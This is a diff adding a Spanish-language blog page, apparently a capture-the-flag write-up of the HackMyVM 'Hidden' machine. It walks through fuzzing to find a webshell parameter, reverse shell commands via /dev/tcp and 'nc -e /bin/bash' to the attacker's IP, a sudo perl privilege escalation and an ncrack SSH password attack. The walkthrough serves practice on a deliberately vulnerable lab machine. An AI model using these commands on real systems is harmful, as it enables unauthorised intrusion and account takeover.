@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hidden, HACKMYVM | Apuntes solo ctf y juegos hacking</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Hidden, HACKMYVM" />
+<meta name="author" content="Quino" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shell" />
+<meta property="og:description" content="En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shell" />
+<link rel="canonical" href="http://localhost:4000/hidden" />
+<meta property="og:url" content="http://localhost:4000/hidden" />
+<meta property="og:site_name" content="Apuntes solo ctf y juegos hacking" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-11-26T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hidden, HACKMYVM" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Quino"},"dateModified":"2023-11-26T00:00:00-03:00","datePublished":"2023-11-26T00:00:00-03:00","description":"En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shell","headline":"Hidden, HACKMYVM","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hidden"},"url":"http://localhost:4000/hidden"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Apuntes solo ctf y juegos hacking" /></head><body><header class="site-header"><a class="site-title" rel="author" href="/">Apuntes solo ctf y juegos hacking</a><nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <div class="trigger">
+            <a class="page-link" href="/about">
+              About
+            </a>
+            <a class="page-link" href="/contact">
+              Contact
+            </a></div>
+    </nav><div class="site-icon">
+    <img src="assets/default-icon.png" />
+  </div>
+
+</header><main class="page-content" aria-label="Content">
+        <div class="wrapper">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hidden, HACKMYVM</h1>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shell</p>
+
+<p><img src="assets/img_hidden/hidden.png" alt="portada" /></p>
+
+<h2 id="herramientas-y-software-utilizado">Herramientas y software utilizado</h2>
+
+<ul>
+  <li>arp-scan</li>
+  <li>nmap</li>
+  <li>gobuster , wfuzz</li>
+  <li>sudo</li>
+  <li>python3 http.server</li>
+  <li>ncrack</li>
+</ul>
+
+<p>Una vez encontrada la maquina realizamos un scan de puertos con nmap</p>
+
+<p><img src="assets/img_hidden/nmap.png" alt="nmap" /></p>
+
+<p>Como vemos en este caso solo tenemos el puerto 22 y el 80 asi que primero vamos a ver la web y su codigo fuente.</p>
+
+<p><img src="assets/img_hidden/web1.png" alt="web1" /></p>
+
+<p>En la web nos encontramos  con una imagen con un codigo extraño y su nombre indica que lo decodifiquemos y mas abajo en un comentario nos indica que ese codigo usa un formato concreto.</p>
+
+<p><img src="assets/img_hidden/code_level1.png" alt="code_level1" /></p>
+
+<p>Nos vamos a la siguiente web https://www.dcode.fr/tic-tac-toe-cipher y buscamos la codificacion correcta para nuestro codigo para poder obtener algo legible.</p>
+
+<p><img src="assets/img_hidden/level1.png" alt="level1" /></p>
+
+<blockquote>
+  <p>¿Cuál es la diferencia entre codificar y cifrar?
+Los códigos por lo general operan sobre la semántica, significados, mientras que los cifrados operan sobre la sintaxis, símbolos. 
+Un código se almacena como un mapeo en un libro de códigos, mientras que los cifrados transforman símbolos individuales de acuerdo con un algoritmo.</p>
+</blockquote>
+
+<p>Una vez localizado y decodeado lo añadimos a /etc/hosts vamos a la web de nuevo a ver que hay.</p>
+
+<p><img src="assets/img_hidden/etc_hosts.png" alt="etc_hosts" /></p>
+
+<p><img src="assets/img_hidden/level2.png" alt="level2" /></p>
+
+<p>Como vemos no hay nada util asi que toca hacer fuzzing contra la ruta añadida en etc/hosts para buscar directorios y archivos ocultos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://sys.hidden.hmv <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/gobuster.png" alt="gobuster" /></p>
+
+<p>Como vemos nos muestra tres directorios ocultos dos de ellos son para distraernos y uno de ellos nos devuelve una web en blanco.</p>
+
+<p>Vamos a hacer fuzzing de nuevo contra ese otro directorio para ver si esconde algo mas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://sys.hidden.hmv/weapon <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+<p><img src="assets/img_hidden/level_weapon.png" alt="level_weapon" /></p>
+
+<p>Nos encuentra un archivo con nombre loot.php al que tenemos acceso pero nos devuelve una web en blanco , me hace pensar que hay una webshell , pero nos faltan datos para hacer uso de ella si es que existe .</p>
+
+<p>Esta vez neceitamos encontrar la carga que falta para poder ejecutar comandos y vamos a hacer uso de otro fuzzer en este caso wfuzz para ver si encuentra la carga util que nos faltaria.</p>
+
+<blockquote>
+  <p>Las webshell siempre tienen este fomato:
+htttp:direccion/archivo.php?loquesea=comando
+Al menos por lo que he visto hasta la fecha pero imagino que pueden crearse con otro lenguaje.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/dirb/wordlists/big.txt  <span class="nt">-u</span> http://sys.hidden.hmv/weapon/loot.php<span class="se">\?</span>FUZZ<span class="se">\=</span><span class="nb">ls</span> <span class="nt">--hw</span> 0
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/wfuzz_rce.png" alt="wfuzz_rce" /></p>
+
+<p><img src="assets/img_hidden/web_rce_ok.png" alt="web_rce_ok" /></p>
+
+<p>Como vemos en la imagen y despues de varias pruebas con otros fuzzers encontro la palabrita que nos da paso a la ejecucion de comandos remota , es momento de mandarnos una reverseshell.</p>
+
+<p>Para ello podemos buscar en internet hay varias paginas que te la crean yo uso la siguiente https://www.revshells.com/.</p>
+
+<p>Lo primero es poner nuestra maquina a la escucha:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvpn</span> 9001
+</code></pre></div></div>
+
+<p>Despues en la webshell ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Este intento no me conecto ni encodeando la url acto seguido hago lo mismo pero llamando a nc directamente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 20192.168.0.112 9001 <span class="nt">-e</span> sh
+</code></pre></div></div>
+
+<p>Con este segundo metodo tampoco me conectaba como esperaba pueden ver el error en la imagen de abajo al igual que la conexion exitosa cuando cambie el sh por un /bin/bash quedando el comando de la siguiente manera.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 20192.168.0.112 9001 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/nc_errors_ok.png" alt="nc_errors_ok.png" /></p>
+
+<p>Spanw de shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p>Aqui podemos ver el fichero que creo para verificar que la carga util era la palabra hack que por lo general usan cmd , exec , etc….</p>
+
+<p><img src="assets/img_hidden/contenido_loop.png" alt="loop" /></p>
+
+<p>Ahora como siempre lo primero sera un sudo -l o permisos suid con find para algun binario o script personal.</p>
+
+<p><img src="assets/img_hidden/sudo-l_toreto.png" alt="sudo-ltoreto" /></p>
+
+<p>Al hacer un ls sobre el home vemos que hay dos usuario toreto y atenea y el usuario toreto puede ejcutar perl con permisos sudo . 
+Vamos a gtofbins para ver como se hace y poder acceder al sistema de ficheros de toreto conservando sus privilegios.</p>
+
+<blockquote>
+  <p>Recordar que sois www-data hay que indicarle a sudo con el usuario que quereis ejecutar sudo.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> toreto perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash" ;'</span>
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/acceso_toreto.png" alt="acceso_toreto" /></p>
+
+<p>El usuario toreto no tiene nada interesante revisamos el user atenea y encontramos una carpeta oculta con un diccionario de claves , debemos descargarlo y lanzar cualquier software que permita ataque por diccionario.
+Para ello levanto un servicio web con python en el directorio</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>Descargamos el diccionario y lanzamos en mi caso ncrack</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncrack <span class="nt">-p</span> 22 <span class="nt">--user</span> atenea <span class="nt">-P</span> atenea.txt 192.168.0.101
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/ncrack.png" alt="ncrak" /></p>
+
+<p>Nos logueamos por ssh con el user y la pass y empezmos la escala final como antes con sudo -l.</p>
+
+<p><img src="assets/img_hidden/login_atenea.png" alt="login_atenea" /></p>
+
+<p><img src="assets/img_hidden/sudo_atenea.png" alt="sudo_atenea" /></p>
+
+<p>Consultamos gtofbins para ver como se hace la escala con socat.</p>
+
+<p>Para variar no olviden buscar las flags</p>
+
+<p>Muchas gracias por leer.</p>
+
+  </div>
+
+  <p class="post-meta"><time class="dt-published" datetime="2023-11-26T00:00:00-03:00" itemprop="datePublished">
+        Nov 26, 2023
+      </time>• 
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span class="p-author h-card" itemprop="name">Quino</span></span></p>
+  
+
+  <a class="u-url" href="/hidden" hidden></a>
+</article><div class="comments"><div id="hyvor-talk-view"></div>
+<script type="text/javascript">
+    var HYVOR_TALK_WEBSITE = '10000'; // DO NOT CHANGE THIS
+    var HYVOR_TALK_CONFIG = {
+        url: 'http://localhost:4000/hidden',
+        id: '/hidden',
+        palette: {
+            accent: "#86bb48",
+            accentText: "#080808",
+            footerHeader: "#171616",
+            footerHeaderText: "#656363",
+            box: "#3A3A38",
+            boxText: "#E0E0E0",
+            boxLightText: "#AAAAAA",
+            backgroundText: "#E0E0E0"
+        }
+    };
+</script>
+<script async type="text/javascript" src="//talk.hyvor.com/web-api/embed"></script></div>
+        </div>
+    </main><footer class="site-footer h-card">
+    <data class="u-url" href="/"></data>
+
+    <div class="wrapper">
+
+        <div class="footer">
+            <div class="footer-title">2023 &copy; Apuntes solo ctf y juegos hacking</div>
+
+            <div class="footer-social-links">
+                <a target="_blank" rel="me" href="https://github.com/firstatack">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub icon</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+                </a>
+                <a target="_blank" rel="me" href="https://twitter.com/firstatack">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter icon</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+                    </a>
+            </div>
+        </div>
+    </div>
+
+</footer></body>
+
+</html>
